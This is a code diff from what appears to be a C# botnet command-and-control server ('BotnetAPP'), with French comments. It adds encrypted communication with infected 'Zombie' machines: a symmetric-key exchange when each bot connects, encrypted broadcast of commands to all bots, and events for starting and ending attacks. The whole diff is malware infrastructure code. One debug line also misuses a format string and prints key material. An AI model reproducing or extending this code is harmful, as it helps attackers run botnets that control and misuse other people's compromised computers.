@@ -61,11 +61,7 @@ namespace BotnetAPP.Network
         // méthode permettant de déclencher les événements 
         public void OnNewConnectedBot(Zombie zombie) => NewConnectedBot?.Invoke(zombie);
         public void OnDisconnectionBot(Zombie zombie) => NewDisconnectionBot?.Invoke(zombie);
-
-        public void OnUpdateAction(Zombie zombie)
-        {
-            UpdateAction?.Invoke(zombie);
-        }
+        public void OnUpdateAction(Zombie zombie) =>  UpdateAction?.Invoke(zombie);
         public void OnNewAttack(Zombie zombie) => NewAttack?.Invoke(zombie);
         public void OnEndAttack(Zombie zombie) => EndAttack?.Invoke(zombie);
 
@@ -158,6 +154,12 @@ namespace BotnetAPP.Network
         // A écrire pour simplifier le processus de communication
         private void WriteNetMessage(string message, Socket s) => s.Send(_asen.GetBytes(message));
 
+        /*
+        Dans le cas ou le message est chiffrer on a pas besoin de le convertir en
+        bytes 
+        */
+        private void WriteNetMessage(byte[] message, Socket s) => s.Send(message) ; 
+
 
         // Envoie un message a tout les bots connectés 
         private void BroadcastNetMessage(string message)
@@ -168,8 +170,8 @@ namespace BotnetAPP.Network
             foreach (KeyValuePair<Zombie, Socket> item in bot)
             {
 
-                // On encrypte avec la clé publique du client 
-                WriteNetMessage(_encryption.Encrypt(message, item.Key), item.Value);
+                // On encrypte avec la clé symétrique partagée avec le client
+                WriteNetMessage(Encryption.Encrypt(message, item.Key.SharedSymKey), item.Value);
             }
         }
 
@@ -313,9 +315,18 @@ namespace BotnetAPP.Network
 
                     // On récupère la clé publique
 
-                
-                    Zombie nvZb = new(s.RemoteEndPoint.ToString(), GetIncomingMessage(s));
+                    string symmetricKey = Encryption.GenerateSymKey() ;
+                    string asymmectricKey = GetIncomingMessage(s) ;
+
+                    Console.WriteLine("Clé assymétrique obtenue ") ; 
+
+                    Zombie nvZb = new(s.RemoteEndPoint.ToString(), asymmectricKey, symmetricKey);
+
+                    WriteNetMessage(_encryption.Encrypt(symmetricKey, nvZb), s) ;  
                     _bot.Add(nvZb, s);
+                    Console.WriteLine("clé symétrique générer est envoyé") ;
+                    Console.WriteLine("La clé est {0}"+asymmectricKey) ;
+                    
                     OnNewConnectedBot(nvZb);
 
                         
